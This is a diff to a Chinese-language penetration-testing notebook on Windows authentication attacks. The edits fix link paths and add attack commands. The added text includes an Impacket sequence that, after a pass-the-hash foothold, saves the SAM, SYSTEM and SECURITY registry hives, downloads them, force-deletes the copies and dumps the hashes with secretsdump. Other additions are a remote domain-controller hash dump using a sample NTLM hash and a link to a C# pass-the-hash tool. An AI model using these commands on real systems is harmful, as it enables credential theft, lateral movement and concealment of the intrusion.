@@ -25,7 +25,7 @@
 * **[认证](#认证)**
     * [本地](#本地)
     * [工作组](#工作组)
-        * [IPC$](#ipc\$)
+        * [IPC$](#ipc)
         * [PTH](#pth)
         * [PTK](#ptk)
     * [域](#域)
@@ -472,7 +472,7 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
 # 认证
 
-关于 windows 认证的基本知识点可见笔记 [认证](../../../Integrated/windows/笔记/认证.md)
+关于 windows 认证的基本知识点可见笔记 [认证](../../../Integrated/Windows/笔记/认证.md)
 
 ## 本地
 
@@ -501,6 +501,22 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
     ```
 - [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
 - [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。
+- Impacket
+    ```
+    # 通过 wmiexec pth 后
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+    get system.save
+    get sam.save
+    get security.save
+    del /f system.save
+    del /f sam.save
+    del /f security.save
+    ```
+    ```
+    ./secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+    ```
 
 ---
 
@@ -508,7 +524,7 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
 ### IPC$
 
-关于 IPC$ 应用的基本知识点可见笔记 [IPC$](../../../Integrated/windows/笔记/IPC$.md)
+关于 IPC$ 应用的基本知识点可见笔记 [IPC$](../../../Integrated/Windows/笔记/IPC$.md)
 
 **相关文章**
 - [IPC$入侵大全](https://www.cnblogs.com/backlion/p/7401609.html)
@@ -670,6 +686,8 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
     ```bash
     cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
     ```
+
+- **[SharpMapExec](https://github.com/cube0x0/SharpMapExec)** - c#版本的cme
 
 #### kb2871997
 
@@ -866,8 +884,9 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 - 工具地址 : [impacket](https://github.com/SecureAuthCorp/impacket)
 
 Impacket 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。impacket-secretsdump 模块需要我们提供 SYSTEM 和 NTDS 数据库文件。
+
 ```bash
-impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
+./secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 
 # system：表示系统 hive 文件的路径（SYSTEM）
 # ntds：表示 dit 文件的路径（ntds.dit）
@@ -875,7 +894,7 @@ impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 
 此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证从 NTDS.DIT 文件远程转储域密码哈希。
 ```bash
-impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
 
 **DSInternals PowerShell**
@@ -928,7 +947,7 @@ dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 data --syshi
 
 ### GPP
 
-关于 windows 组策略的基本知识点可见笔记 [组策略](../../../Integrated/windows/笔记/组策略.md)
+关于 windows 组策略的基本知识点可见笔记 [组策略](../../../Integrated/Windows/笔记/组策略.md)
 
 在 GPP 出现之前，很多统一管理的操作只能通过脚本来实现，而 GPP 方便和简化了这样的管理,GPP 你可以将其理解为一个功能点,作用是简单化、规范化组策略的发布和使用。
 
